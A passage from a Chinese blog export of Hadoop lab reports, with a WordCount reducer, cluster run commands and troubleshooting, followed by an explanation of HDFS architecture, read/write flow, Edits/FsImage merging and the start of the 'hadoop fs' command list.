<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KEYIN, reduce阶段输入的key的类型：Text</span></span><br><span class="line"><span class="comment"> * VALUEIN,reduce阶段输入value类型：IntWritable</span></span><br><span class="line"><span class="comment"> * KEYOUT,reduce阶段输出的Key类型：Text</span></span><br><span class="line"><span class="comment"> * VALUEOUT,reduce阶段输出的value类型：IntWritable</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable,Text,IntWritable&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">IntWritable</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// atguigu, (1,1)</span></span><br><span class="line">        <span class="comment">// 累加</span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable value : values) &#123;</span><br><span class="line">            sum += value.get();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        outV.set(sum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写出</span></span><br><span class="line">        context.write(key,outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Hadoop集群测试WordCount"><a href="#Hadoop集群测试WordCount" class="headerlink" title="Hadoop集群测试WordCount"></a>Hadoop集群测试WordCount</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建文件夹input</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop fs -mkdir /input</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将word.txt上传到hdfs中</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop fs -put /Users/huangmingwang/Documents/input/word.txt /input </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行wordcount程序</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>





<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><h3 id="在Mac上配置hadoop环境结果"><a href="#在Mac上配置hadoop环境结果" class="headerlink" title="在Mac上配置hadoop环境结果"></a>在Mac上配置hadoop环境结果</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110274.png" alt="截屏2021-06-30 下午7.42.02"></p>
<h3 id="本地测试结果"><a href="#本地测试结果" class="headerlink" title="本地测试结果"></a>本地测试结果</h3><p>执行本地wordcount程序成功：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110276.png" alt="截屏2021-07-01 上午9.16.23"></p>
<p>程序输出结果展示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110277.png" alt="截屏2021-07-01 上午9.18.17"></p>
<h3 id="Hadoop集群执行wordcount结果"><a href="#Hadoop集群执行wordcount结果" class="headerlink" title="Hadoop集群执行wordcount结果"></a>Hadoop集群执行wordcount结果</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110278.png" alt="image-20210701104645182"></p>
<p>word.txt:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220108775.png" alt="截屏2021-07-01 上午10.47.12 (2)"></p>
<p>结果：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110279.png" alt="截屏2021-07-01 上午10.48.00 (2)"></p>
<p>任务历史：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110280.png" alt="截屏2021-07-01 上午10.49.52 (2)"></p>
<h2 id="四、实验遇到的问题及解决方法"><a href="#四、实验遇到的问题及解决方法" class="headerlink" title="四、实验遇到的问题及解决方法"></a>四、实验遇到的问题及解决方法</h2><h3 id="在mac上操作hdfs时报错"><a href="#在mac上操作hdfs时报错" class="headerlink" title="在mac上操作hdfs时报错"></a>在mac上操作hdfs时报错</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220109737.png" alt="image-20210701100816545"></p>
<p>解决方法：</p>
<p>hadoop集群的用户权限是huang，在环境变量设置为用户为huang即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置环境变量</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % sudo vi .bash_profile </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hadoop</span></span><br><span class="line">export HADOOP_HOME=/Users/huangmingwang/Documents/Hadoop/hadoop-3.1.3 </span><br><span class="line">export HADOOP_USER_NAME=huang</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br></pre></td></tr></table></figure>

<h3 id="运行wordcount程序报错"><a href="#运行wordcount程序报错" class="headerlink" title="运行wordcount程序报错"></a>运行wordcount程序报错</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220109339.png" alt="1"></p>
<p>解决方法：</p>
<p>删除文件夹output，或者将输出文件夹改名；</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-2 HDFS</title>
    <url>/2021/12/22/Lab-2%20HDFS/</url>
    <content><![CDATA[<h1 id="Lab-2-Hadoop-HDFS-分布式文件系统基本操作"><a href="#Lab-2-Hadoop-HDFS-分布式文件系统基本操作" class="headerlink" title="Lab-2 Hadoop(HDFS)分布式文件系统基本操作"></a>Lab-2 Hadoop(HDFS)分布式文件系统基本操作</h1><h2 id="一、实验原理分析"><a href="#一、实验原理分析" class="headerlink" title="一、实验原理分析"></a>一、实验原理分析</h2><h3 id="HDFS是什么"><a href="#HDFS是什么" class="headerlink" title="HDFS是什么"></a>HDFS是什么</h3><p>HDFS（Hadoop Distributed File System） 是一个高度容错性的系统，适合部署在廉价的机器上。HDFS 能提供高吞吐量的数据访问，非常适合大规模数据集上的应用。HDFS 放宽了一部分 POSIX 约束，来实现流式读取文件系统数据的目的。HDFS 在最开始是作为 Apache Nutch 搜索引擎项目的基础架构而开发的。HDFS 是 Apache Hadoop Core 项目的一部分。</p>
<h4 id="HDFS优点"><a href="#HDFS优点" class="headerlink" title="HDFS优点"></a>HDFS优点</h4><ul>
<li><p>保存多个副本，且提供容错机制，副本丢失或宕机自动恢复。默认存3份。为防止某个主机失效读取不到该主机的块文件，它将同一个文件块副本分配到其他某几个主机上。</p>
</li>
<li><p>运行在廉价的机器上。</p>
</li>
<li><p>适合大数据的处理。HDFS会将一个完整的大文件平均分块存储到不同计算机上，默认会将文件分割成block，64M为1个block。然后将block按键值对存储在HDFS上，并将键值对的映射存到内存中。如果小文件太多，那内存的负担会很重。</p>
</li>
<li><p>流式数据访问，一次写入多次读写，和传统文件不同，它不支持动态改变文件内容，而是要求让文件一次写入就不做变化，要变化只能在文件末尾添加</p>
</li>
</ul>
<h4 id="HDFS缺点"><a href="#HDFS缺点" class="headerlink" title="HDFS缺点"></a>HDFS缺点</h4><ul>
<li><p>不适合低延时的数据访问，比如毫秒级的存储数据，是做不到的</p>
</li>
<li><p>无法高效的对大量小文件进行存储</p>
<ul>
<li>存储大量小文件的话，它会占用NameNode大量的内存来存储文件目录和块信息。这样是不可取的，因为NameNode的内存是有限的。</li>
<li>小文件的存储的寻址时间会超过读取时间，它违反了HDFS的设计目标</li>
</ul>
</li>
<li><p>不支持并发写入，文件随机修改</p>
<ul>
<li>一个文件只能有一个写，不允许多个线程同时写；</li>
<li>仅支持数据append（追加），不支持文件的随机修改</li>
</ul>
</li>
</ul>
<h3 id="HDFS架构"><a href="#HDFS架构" class="headerlink" title="HDFS架构"></a>HDFS架构</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220103740.png" alt="image-20210628203053925"></p>
<h4 id="HDFS-client"><a href="#HDFS-client" class="headerlink" title="HDFS client"></a>HDFS client</h4><p>我们和HDFS打交道是通过一个client library。无论是读取一个文件还是写一个文件，都是先把数据交给HDFS client，它负责和Name nodes以及Data nodes联系并传输数据。</p>
<h4 id="NameNode"><a href="#NameNode" class="headerlink" title="NameNode"></a>NameNode</h4><p>在HDFS中，Namenode 保存了整个文件系统信息，包活文件和文件夹的机构。其实和linux上的很像，HDFS也是把文件和文件夹表示为inode，每个inode有自己的所有者，权限，创建的修改时间等等。HDFS可以存很大的文件，所以每个文件被分为一些data block，存在不同的机器上，name node就负责记录一个文件有哪些data block，以及这些data block分别存放在那些机器上。</p>
<p>Namenode 还负责管理文件系统常用操作，比如创建一个文件，重命名一个文件，创建一个文件夹，重命名一个文件夹等。</p>
<p>当我们通过HDFS client先HDFS读取或者写文件时，所有的都写请求都是先发给Name nodes，它负责创建或者查询一个文件，然后再让HDFS client和 Data nodes联系具体的数据传输。</p>
<h4 id="DataNode"><a href="#DataNode" class="headerlink" title="DataNode"></a>DataNode</h4><p>存储data block的机器叫做Data nodes。在读写过程中，Data nodes负责直接把用户读取的文件block传给client，也负责直接接受用户写的文件。</p>
<p>当我们读取一个文件时：</p>
<ul>
<li>HDFS client 联系 Name nodes，获取文件的 data blocks 组成、以及每个 data block 所在的机器以及具体存放位置；</li>
<li>HDFS client 联系 Data nodes, 进行具体的读写操作；</li>
</ul>
<p>重要的事情说三遍。在读写一个文件时，当我们从 Name nodes 得知应该向哪些 Data nodes 读写之后，我们就直接和 Data node 打交道，不再通过 Name nodes。</p>
<h4 id="Secondary-NameNode"><a href="#Secondary-NameNode" class="headerlink" title="Secondary NameNode"></a>Secondary NameNode</h4><p>并非NameNode的热备。当NameNode挂掉的时候，它并不能马上替换NameNode 并提供服务。</p>
<p>辅助NameNode，分担其工作量，比如定期合并Fsimage和Edits，并推送给NameNode。</p>
<p>在紧急情况下，可辅助恢复NameNode。</p>
<h3 id="HDFS文件写入"><a href="#HDFS文件写入" class="headerlink" title="HDFS文件写入"></a>HDFS文件写入</h3><p>Client向NameNode发起文件写入的请求。</p>
<ol>
<li>NameNode根据文件大小和文件块配置情况，返回给Client它所管理部分DataNode的信息。</li>
<li>Client将文件划分为多个block块，并根据DataNode的地址信息，按顺序写入到每一个DataNode块中。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220103741.png" alt="58qho28cfd"></p>
<p>例如：有一个文件FileA，100M大小。Client将FileA写入到HDFS上。</p>
<ol>
<li>HDFS按默认配置。</li>
<li>HDFS分布在三个机架上Rack1，Rack2，Rack3。</li>
</ol>
<p>文件写入过程如下：</p>
<ol>
<li>Client将FileA按64M分块。分成两块，block1和Block2;</li>
<li>Client向NameNode发送写数据请求，如图蓝色虚线①——&gt;。</li>
<li>NameNode节点，记录block信息。并返回可用的DataNode，如粉色虚线②———&gt;。<ol>
<li>Block1: host2,host1,host3</li>
<li>Block2: host7,host8,host4</li>
<li>原理：<ol>
<li>NameNode具有RackAware机架感知功能，这个可以配置。</li>
<li>若Client为DataNode节点，那存储block时，规则为：副本1，同Client的节点上；副本2，不同机架节点上；副本3，同第二个副本机架的另一个节点上；其他副本随机挑选。</li>
<li>若Client不为DataNode节点，那存储block时，规则为：副本1，随机选择一个节点上；副本2，不同副本1，机架上；副本3，同副本2相同的另一个节点上；其他副本随机挑选。</li>
</ol>
</li>
</ol>
</li>
<li>Client向DataNode发送block1；发送过程是以流式写入。流式写入过程如下：<ol>
<li>将64M的block1按64k的package划分;</li>
<li>然后将第一个package发送给host2;</li>
<li>host2接收完后，将第一个package发送给host1，同时Client向host2发送第二个package；</li>
<li>host1接收完第一个package后，发送给host3，同时接收host2发来的第二个package。</li>
<li>以此类推，如图红线实线所示，直到将block1发送完毕。</li>
<li>host2,host1,host3向NameNode，host2向Client发送通知，说“消息发送完了”。如图粉红颜色实线所示。</li>
<li>Client收到host2发来的消息后，向NameNode发送消息，说我写完了。这样就真完成了。如图黄色粗实线</li>
<li>发送完block1后，再向host7、host8、host4发送block2，如图蓝色实线所示。</li>
<li>发送完block2后，host7、host8、host4向NameNode，host7向Client发送通知，如图浅绿色实线所示。</li>
<li>Client向NameNode发送消息，说我写完了，如图黄色粗实线。。。这样就完毕了。</li>
</ol>
</li>
<li>分析：通过写过程，我们可以了解到<ol>
<li>写1T文件，我们需要3T的存储，3T的网络流量带宽。</li>
<li>在执行读或写的过程中，NameNode和DataNode通过HeartBeat进行保存通信，确定DataNode活着。如果发现DataNode死掉了，就将死掉的DataNode上的数据，放到其他节点去。读取时，要读其他节点去。</li>
<li>挂掉一个节点，没关系，还有其他节点可以备份；甚至，挂掉某一个机架，也没关系；其他机架上，也有备份。</li>
</ol>
</li>
</ol>
<h3 id="HDFS文件读取"><a href="#HDFS文件读取" class="headerlink" title="HDFS文件读取"></a>HDFS文件读取</h3><p>当文件读取：</p>
<ol>
<li>Client向NameNode发起文件读取的请求。</li>
<li>NameNode返回文件存储的block块信息、及其block块所在DataNode的信息。</li>
<li>Client读取文件信息。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220104177.png" alt="1"></p>
<p>如图所示，Client要从DataNode上，读取FileA。而FileA由block1和block2组成。读操作流程如下：</p>
<ol>
<li>Client向NameNode发送读请求。</li>
<li>NameNode查看Metadata信息，返回FileA的block的位置。<ol>
<li>block1:host2,host1,host3</li>
<li>block2:host7,host8,host4</li>
</ol>
</li>
<li>block的位置是有先后顺序的，先读block1，再读block2。而且block1去host2上读取；然后block2，去host7上读取。</li>
</ol>
<p>上面例子中，Client位于机架外，那么如果Client位于机架内某个DataNode上，例如,Client是host6。那么读取的时候，遵循的规律是：<strong>优选读取本机架上的数据。</strong></p>
<p>问题：如果读取block是按照先后顺序读，是否意味着在不同副本之间的读取是不平均的，没有考虑通过负载策略来提高读效率吗？</p>
<h3 id="备份数据的存放"><a href="#备份数据的存放" class="headerlink" title="备份数据的存放"></a>备份数据的存放</h3><p>备份数据的存放是HDFS可靠性和性能的关键。HDFS采用一种称为rack-aware的策略来决定备份数据的存放。</p>
<p>通过一个称为Rack Awareness的过程，NameNode决定每个DataNode所属rack id。</p>
<p>缺省情况下，一个block块会有三个备份：</p>
<ol>
<li>一个在NameNode指定的DataNode上</li>
<li>一个在指定DataNode非同一rack的DataNode上</li>
<li>一个在指定DataNode同一rack的DataNode上。</li>
</ol>
<p>这种策略综合考虑了同一rack失效、以及不同rack之间数据复制性能问题。</p>
<p>副本的选择：为了降低整体的带宽消耗和读取延时，HDFS会尽量读取最近的副本。如果在同一个rack上有一个副本，那么就读该副本。如果一个HDFS集群跨越多个数据中心，那么将首先尝试读本地数据中心的副本。</p>
<h3 id="Edits和Fsimage详解与合并流程"><a href="#Edits和Fsimage详解与合并流程" class="headerlink" title="Edits和Fsimage详解与合并流程"></a>Edits和Fsimage详解与合并流程</h3><h4 id="NameNode如何管理和存储元数据"><a href="#NameNode如何管理和存储元数据" class="headerlink" title="NameNode如何管理和存储元数据"></a>NameNode如何管理和存储元数据</h4><p>计算机中存储数据有两种：内存或磁盘 元数据存储磁盘: 存储磁盘无法面对客户端对元数据信息的任意的快速低延迟的响应，但是安全性高元数据存储内存：元数据存放内存，可以高效的查询以及快速响应客户端的查询请求，数据保存在内存，如果断电，内存中的数据全部丢失</p>
<p>因此，考虑上述两种存储方式的优缺点，HDFS采用了内存+磁盘的形式来管理元数据。即: NameNode(内存)+FsImage文件. 其中，NameNode文件维护了文件与数据块的映射表以及数据块与数据节点的映射表，比如，一个文件它被切分成了几个数据块，这些数据块分别存储在哪些datanode节点上。而Fsimage保存在磁盘上，为某一时刻下内存中元数据在本地磁盘的映射。就是在该时刻下，内存中元数据记录的所有文件块和目录，分别的状态，位于哪些datanode，各自的权限，各自的副本个数等 (可以通过查看Fsimage保存的内容可以看到上述信息)。因此，利用<strong>内存</strong>+<strong>磁盘</strong>的方式，内存中的元数据可以快速响应客户端的用户请求，而映射到磁盘中的元数据Fsimage可以实现安全性，防止数据的丢失。</p>
<p>而接下来的一个新问题是：磁盘和内存中的元数据如何进行划分。 即两个数据一摸一样，还是两个数据合并到一起才是一份完整的数据呢？</p>
<ul>
<li><strong>一模一样</strong>：client如果对元数据进行增删改操作，需要保证两个数据的一致。FsImage文件操作起来效率也不高，因为FsImage存储在磁盘中，对磁盘中的内容进行写入势必会增加很多的IO操作，也要占用CPU。此时，相当于每一次增删改操作，都需要对两个文件同时进行修改。</li>
<li><strong>两个合并&#x3D;完整数据</strong>：由于如果要将操作写入磁盘会降低运行效率。所以想法就是对于增删改操作，只有内存中的元数据进行响应，而不直接进行磁盘IO读写。此时，为了保证两个数据的一致性，NameNode就引入了以一个edits文件，该日志文件只能进行追加写入，以此来记录client的每次增删改操作。虽然此时仍然有IO流的操作，但是相比于每次将元数据内容写入Fsimage，edits日志文件的写入内容更少，效率更高。</li>
</ul>
<p>至此我们知道了HDFS元数据管理机制采用了内存+磁盘的形式，内存中的NameNode来快速响应客户端的查询请求，磁盘中的元数据作为备份，防止数据的丢失。同时，为了保证内存和磁盘中元数据的一致，hdfs采用了一个edits的日志文件，该文件记录了客户端对元数据的操作。利用edits+Fsimage的形式，就完成了对元数据的管理和存储。</p>
<h4 id="FsImage"><a href="#FsImage" class="headerlink" title="FsImage"></a>FsImage</h4><p>FsImage: 是namenode中关于元数据的镜像，一般称为检查点(checkpoing)，这里包含了HDFS文件系统所有目录以及文件相关信息（Block数量，副本数量，权限等信息）</p>
<p>在机器学习或这深度学习模型训练的过程中，为了防止异常中断，所以都会设定在某一具体时刻或者效果达到最好结果时，将模型参数都保存下来。这样，后续就可以在异常中断后利用来文件直接对模型的参数进行初始化赋值，而不用再重新进行训练。在模型训练中保存的文件也叫作checkpoint。因此这里HDFS的检查点checkpoint也可以同样来理解。即FsImage保存了某一时刻下元数据内的所有信息，这样，当HDFS异常中断或者程序启动时，就可以利用该检查点文件，来对元数据进行初始化，以此还原到异常中断或程序停止前的最新状态。</p>
<h4 id="Edits文件"><a href="#Edits文件" class="headerlink" title="Edits文件"></a>Edits文件</h4><p>存储了客户端对HDFS文件系统所有的更新操作记录，Client对HDFS文件系统所有的更新操作都会被记录到Edits文件中(不包括查询操作)</p>
<p>Client对HDFS的更新操作会更新内存中的元数据信息，而不会直接写入到FsImage文件中。那么为了保证内存和磁盘中元数据信息的一致性，就利用了edits文件来记录下所有的更新操作。<strong>edits文件记录的就是当原FsImage被载入内存后，Client又对元数据进行了哪些操作。</strong> 这样，只要在原FsImage中执行这些操作，对保存的元数据信息进行更新，就可以使得内存和磁盘汇总的元数据信息一致。通过此方法，即解决了为了保证一致性，要对FsImage直接进行写入的过程。这也是引入edits文件的关键原因。</p>
<h4 id="Fsimage与Edits的合并"><a href="#Fsimage与Edits的合并" class="headerlink" title="Fsimage与Edits的合并"></a>Fsimage与Edits的合并</h4><p>因为edits文件是一个只能追加写入的文件，在程序运行过程中会不断的记录客户端的更新操作。同时，根据上面对Edits中的介绍可知，引入载入的FsImage的元数据内容不是最新状态，所以只有在FsImage的内容上，执行edits文件中的更新操作，才能将FsImage的元数据更新为最新状态。此时，假设edits不断的进行追加写，当某一时刻需要NameNode重启时，此时NameNode会先将FsImage里面的内容映射到内存中，即相当于对元数据进行初始化，同时为了恢复到最新的状态，还需要在一条一条的执行edits中的记录。当edits文件非常大时，会导致NameNode启动过程非常慢，而在这段时间HDFS系统会处于<strong>安全模式</strong>，即保证了要将元数据恢复到最新后才能接收客户端请求。这显然是不符合用户要求的。因此，就需要设计能不能在NameNode运行的时候使得edits文件小一些，这样就能使启动过程加快。所以就要引入FsImage和Edits的合并过程。</p>
<p>合并过程的执行流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220104944.jpg" alt="2"></p>
<p>首先可以看出，除了NameNode节点外，为了进行合并，还引入了另一个SecondaryNameNode节点。SecondaryNameNode是HDFS架构中的一个组成部分，它是用来保存Namenode中对HDFS metadata的信息的备份而设定的。一般都是将SecondaryNamenode单独运行在一台机器上。</p>
<p>详细流程介绍如下： <strong>首先黑色字体代表的流程表示NameNode自身启动和运行时的流程，下面每个序号对应图中流程。</strong></p>
<p> 1）程序启动时，需要对元数据进行恢复。根据上述对FsImage和edits文件的已经知道，HDFS首先将Fsimage读入内存对元数据进行恢复，然后再读edits文件中的更新操作在恢复后的元数据上进行执行，使得此时的NameNode中保存的是停止前的最新状态。 </p>
<p>2、3）当有客户端执行增删改查操作时，HDFS会记录其中的增删改操作到edits文件中，这样就避免了直接对Fsimage文件的IO操作。 </p>
<ol start="4">
<li>内存中保存的元数据执行客户端的增删改查操作。（FsImage在此阶段是不改变的）</li>
</ol>
<p><strong>粉色字体代表的流程表示SecondaryNameNode对文件的合并流程，下面每个序号对应图中流程。</strong> </p>
<p>1）SecondaryNameNode向NameNode发送请求，询问是否需要进行合并。在Hadoop中通过两个维度来控制是否需要Checkpoint，如图中所示：1) 到定时时间 2) Edits文件是否满或超过了设定的大小范围。</p>
<p>2）如果满足上面的触发条件，则开始下述执行合并流程。 </p>
<p>3、4）由于NameNode需要将此时的edits文件和FsImage文件发送到SecondaryNamenode，所以在NameNode节点上需要停止使用该edits文件，暂时将新的写操作写到一个新的文件比如edits_inprogress_002中，而将原先的edits_inprogress_001重命名为esits_001进行发送。这样，有inprogress标识的edits表示最新正在写入更新操作的文件，而没有该标识，且后面数字最大的edits文件，即表示最后一个已经合并的文件。比如在实际的文件夹下会生成以下文件：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220105511.jpg" alt="img"></p>
<p>各文件名的含义即如上所述。</p>
<p>5）SecondaryNamenode通过HTTP GET方式从NameNode上获取到fsimage和edits文件，并下载到本地的相应目录下。然后，SecondaryNameNode将下载下来的fsimage载入内存，然后一条一条地执行edits文件中的各项更新操作，使得内存中的fsimage保存最新；<strong>这个过程就是edits和fsimage文件的合并。</strong>（是不是跟我们上面说的在NameNode启动时的载入过程很像。HDFS就是利用了另一台机器的资源来对FsImage进行更新，这样NameNode所在节点的资源就只专注响应对客户端的操作）。</p>
<p>6）经过合并阶段之后，FsImage的内容即进行了更新，此时并不与NameNode中的元数据内容一致，相差的仍然是edits_inprogress_002中写入的更新操作。</p>
<p>7、8）SecondaryNameNode会通过post方式将新的FsImage文件发送到NameNode节点上。NameNode将接收到的新的fsimage替换旧的fsimage文件，同时将edit_inprogress_002文件来记录合并后续的更新操作。通过这个过程，edits就变小了。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过上面的描述可以总结几点。</p>
<ol>
<li>为了解决元数据备份的问题，HDFS采用了edits+FsImage的策略，edits文件保存了客户端的更新操作，Fsimage保存了元数据的具体内容。HDFS在运行时将客户端的操作响应在内容中的元数据上，同时将所有的更新操作写入edits文件，避免了直接对FsImage进行操作造成效率降低</li>
<li>HDFS为了解决edits不断追加写入过大的问题，采用了edits与FsImage合并的策略。即edits文件不是一直在原文件中进行写入的，而是在一定时间或者条件后，就把该时间段内客户端的更新操作同步到FsImage文件中，来更新FsImage文件的内容。这样，新的edits文件就可以只记录合并之后的更新操作，从而减小了edits文件的大小。</li>
<li>HDFS通过引入SecondaryNameNode来实现上述过程，利用了一台独立的机器资源来处理合并流程。所谓edits与FsImage的合并，其实就是在SecondaryNamenode内存中，将edits中记录一条一条的在fsiamge中执行，来更新Fsimage的内容。同时，可以知道，SecondaryNameNode获取到的FsImage不是最新的，因为在它从NameNode下载edits和FsImage文件的时候，新的更新操作已经写到新的edits文件里去了（比如这里的edits_inprogress_002）。而这些更新在SecondaryNamenode是没有同步到的。</li>
<li>edits和FsImage利用了文件命名格式来标识各自的最新文件。如fsiamge和edits文件图中所示，edits文件以edits_开头，后面跟一个txid范围端，并且多个edit log之间首尾相连，正在使用的edits文件名字为edits_inprogress_txid。该路径下还会保存两个FsImage文件（<code>dfs.namenode.num.checkpoints.retained</code>在namenode上保存的fsimage个数的默认配置，超过的被删除，默认保存两个）。文件格式为fsimage_txid，txid与edits中的txid对应，表示该fsimage加载的是哪一个edits。比如从图中可以看出，此时的fsimage已经加载到尾数为1545的edits文件内容</li>
</ol>
<h4 id="其它补充"><a href="#其它补充" class="headerlink" title="其它补充"></a>其它补充</h4><p>实际查看FsImage文件的内容时，可以发现Fsimage中是没有记录块所对应DataNode的。比如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220105313.jpg" alt="img"></p>
<p>在内存元数据中是有记录块所对应的datanode信息，但是fsimage中就剔除了这个信息；HDFS集群在启动的时候会加载image以及edits文件，block对应的dn信息都没有记录，集群启动时会有一个安全模式（safemode）,安全模式就是为了让datanode汇报自己当前所持有的block信息给nn来补全元数据。后续每隔一段时间datanode都要汇报自己持有的block信息。因为即使fsimage中记录了datanode信息，但是在恢复元数据的过程中，可能某些datanode节点出现了问题。所以，其实无论FsImage中是否对block的dn信息进行了记录，恢复的时候都是需要dn来汇报自己持有的block信息，这样才是最真实和安全的。</p>
<h2 id="二、实验代码及命令分析"><a href="#二、实验代码及命令分析" class="headerlink" title="二、实验代码及命令分析"></a>二、实验代码及命令分析</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>hadoop fs 具体命令 OR hdfs dfs 具体命令</p>
<p>两个是完全相同的。</p>
<h3 id="命令大全"><a href="#命令大全" class="headerlink" title="命令大全"></a>命令大全</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs</span><br><span class="line">Usage: hadoop fs [generic options]</span><br><span class="line">	[-appendToFile &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-cat [-ignoreCrc] &lt;src&gt; ...]</span><br><span class="line">	[-checksum &lt;src&gt; ...]</span><br><span class="line">	[-chgrp [-R] GROUP PATH...]</span><br><span class="line">	[-chmod [-R] &lt;MODE[,MODE]... | OCTALMODE&gt; PATH...]</span><br><span class="line">	[-chown [-R] [OWNER][:[GROUP]] PATH...]</span><br><span class="line">	[-copyFromLocal [-f] [-p] [-l] [-d] [-t &lt;thread count&gt;] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-copyToLocal [-f] [-p] [-ignoreCrc] [-crc] &lt;src&gt; ... &lt;localdst&gt;]</span><br><span class="line">	[-count [-q] [-h] [-v] [-t [&lt;storage type&gt;]] [-u] [-x] [-e] &lt;path&gt; ...]</span><br><span class="line">	[-cp [-f] [-p | -p[topax]] [-d] &lt;src&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-createSnapshot &lt;snapshotDir&gt; [&lt;snapshotName&gt;]]</span><br><span class="line">	[-deleteSnapshot &lt;snapshotDir&gt; &lt;snapshotName&gt;]</span><br><span class="line">	[-df [-h] [&lt;path&gt; ...]]</span><br><span class="line">	[-du [-s] [-h] [-v] [-x] &lt;path&gt; ...]</span><br><span class="line">	[-expunge]</span><br><span class="line">	[-find &lt;path&gt; ... &lt;expression&gt; ...]</span><br><span class="line">	[-get [-f] [-p] [-ignoreCrc] [-crc] &lt;src&gt; ... &lt;localdst&gt;]</span><br><span class="line">	[-getfacl [-R] &lt;path&gt;]</span><br><span class="line">	[-getfattr [-R] &#123;-n name | -d&#125; [-e en] &lt;path&gt;]</span><br><span class="line">	[-getmerge [-nl] [-skip-empty-file] &lt;src&gt; &lt;localdst&gt;]</span><br><span class="line">	[-head &lt;file&gt;]</span><br><span class="line">	[-help [cmd ...]]</span><br><span class="line">	[-ls [-C] [-d] [-h] [-q] [-R] [-t] [-S] [-r] [-u] [-e] [&lt;path&gt; ...]]</span><br><span class="line">	[-mkdir [-p] &lt;path&gt; ...]</span><br><span class="line">	[-moveFromLocal &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-moveToLocal &lt;src&gt; &lt;localdst&gt;]</span><br><span class="line">	[-mv &lt;src&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-put [-f] [-p] [-l] [-d] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-renameSnapshot &lt;snapshotDir&gt; &lt;oldName&gt; &lt;newName&gt;]</span><br><span class="line">	[-rm [-f] [-r|-R] [-skipTrash] [-safely] &lt;src&gt; ...]</span><br><span class="line">	[-rmdir [--ignore-fail-on-non-empty] &lt;dir&gt; ...]</span><br><span class="line">	[-setfacl [-R] [&#123;-b|-k&#125; &#123;-m|-x &lt;acl_spec&gt;&#125; &lt;path&gt;]|[--set 